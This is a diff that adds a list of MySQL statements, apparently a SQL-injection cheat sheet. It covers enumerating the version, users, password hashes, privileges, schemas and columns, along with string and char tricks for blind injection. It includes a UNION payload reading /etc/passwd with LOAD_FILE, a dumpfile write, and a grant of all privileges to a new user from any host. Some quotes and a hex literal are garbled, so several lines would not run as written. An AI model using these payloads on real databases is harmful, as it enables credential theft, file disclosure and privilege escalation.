@@ -1,0 +1,37 @@
+SELECT @@version;
+SELECT @@version
+SELECT 1;
+SELECT /*comment*/1;
+SELECT user();
+SELECT system_user();
+SELECT user FROM mysql.user;
+SELECT host, user, password FROM mysql.user; 
+SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; 
+SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’;
+SELECT database();
+SELECT schema_name FROM information_schema.schemata;
+SELECT distinct(db) FROM mysql.db;
+SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’;
+SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’;
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’;
+Select Nth Row 	SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;
+SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; 
+SELECT substr(‘abcd’, 3, 1);
+SELECT 6 & 2; 
+SELECT 6 & 1; 
+SELECT char(65); # returns A
+SELECT ascii(‘A’); # returns 65
+SELECT cast(’1′ AS unsigned integer);
+SELECT cast(’123′ AS char);
+SELECT CONCAT(‘A’,'B’); #returns AB
+SELECT CONCAT(‘A’,'B’,'C’); # returns ABC
+SELECT if(1=1,’foo’,'bar’); — returns ‘foo’
+SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; 
+SELECT 0×414243;
+...’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) 
+SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; 
+SELECT @@hostname;
+CREATE USER test1 IDENTIFIED BY ‘pass1′; 
+DROP USER test1; 
+GRANT ALL PRIVILEGES ON *.* TO test1@’%'; 
+SELECT @@datadir;
